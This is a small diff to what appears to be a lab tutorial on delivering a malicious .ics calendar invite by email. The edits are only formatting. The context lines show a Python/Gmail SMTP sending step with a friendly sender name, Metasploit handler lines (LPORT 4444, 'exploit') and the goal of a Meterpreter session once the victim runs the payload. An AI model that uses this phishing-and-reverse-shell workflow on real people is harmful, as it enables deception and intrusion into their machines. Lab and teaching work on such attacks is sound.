@@ -73,10 +73,10 @@ nano malicious_invite.ics
 **We need a Python script that sends an email with a proper calendar invite .ics attachment, including a friendly sender name, via Gmail SMTP.**
 
 What you need before running:
--Python 3 installed
--smtplib and email modules (built-in, no install needed)
--Gmail App Password if your account has 2FA enabled (recommended)
--Your .ics file ready
+    -Python 3 installed
+    -smtplib and email modules (built-in, no install needed)
+    -Gmail App Password if your account has 2FA enabled (recommended)
+    -Your .ics file ready
 
 ### Python script to send .ics invite with friendly sender name
 #### 📁 Save the .py File
@@ -189,6 +189,7 @@ set LPORT 4444
 exploit
 ```
 Replace 192.168.56.101 with your Ubuntu  IP address.
+
 #### 3.Establish Session:
 Once the victim executes the payload, a Meterpreter session should be established.
 
